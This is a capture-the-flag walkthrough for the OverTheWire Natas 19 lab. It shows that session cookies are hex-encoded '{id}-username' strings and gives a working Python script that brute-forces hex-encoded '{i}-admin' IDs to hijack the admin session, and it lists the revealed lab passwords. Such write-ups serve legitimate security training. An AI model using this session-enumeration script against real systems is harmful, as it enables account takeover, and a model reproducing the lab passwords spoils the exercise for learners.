# Natas Level 19 → Level 20

### Challenge

**URL: http://natas19.natas.labs.overthewire.org/**

This level is similar to Natas 18, except the `PHPSESSID` cookie is obscured instead of a plain integer (e.g., `123`).

Upon logging in with a test username (e.g., `test`), we receive a session ID like: `3538322d74657374`

Decoding this string from hexadecimal to ASCII reveals the structure: `3538322d74657374` → `582-test`

The session ID format is `{Numerical_ID}-{username}` encoded in hex.

To bypass authentication, we must find a valid session ID where the username part is `admin`. This means we need to brute force the numerical ID, append `-admin`, hex-encode it, and send it to the server.

---

### Walkthrough

1. Generate `PHPSESSID` cookies that decode to `1-admin`, `2-admin`, ..., `640-admin`.
2. For example, ID `280` encodes as:
   - String: `280-admin`
   - Hex Encoded: `3238302d61646d696e`
   - Cookie: `PHPSESSID=3238302d61646d696e`

3. Adapt the brute-force script to hex-encode each `{i}-admin` value before sending the request:

```
import requests
import binascii

target = "http://natas19.natas.labs.overthewire.org"
auth = ("natas19", "8LMJEhKFbMJRLiwq53HTztGSwJ4SIV4c") # Password from Level 18
headers = {"Content-Type": "application/x-www-form-urlencoded"}

print("Brute forcing Hex-Encoded Session IDs...")

# Assume max ID matches Natas 18 (640).
for i in range(1, 641):
    raw_session = f"{i}-admin"
    encoded_session = raw_session.encode('utf-8').hex()
    cookies = {"PHPSESSID": encoded_session}

    try:
        r = requests.post(target, auth=auth, cookies=cookies, timeout=5)

        if "You are an admin" in r.text:
            print(f"\n[+] Admin session found!")
            print(f"    Raw ID: {raw_session}")
            print(f"    Cookie: {encoded_session}")

            content_lines = r.text.splitlines()
            for line in content_lines:
                if "Password:" in line:
                    print(f"    {line.strip()}")
            break

        if i % 50 == 0:
            print(f"Checked {i} sessions...")

    except Exception as e:
        print(f"Error: {e}")

print("Done.")
```

4. Run the script to find the admin session ID and password.

---

### Credentials Found

- **Username:** `natas20`
- **Password:** `p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw`
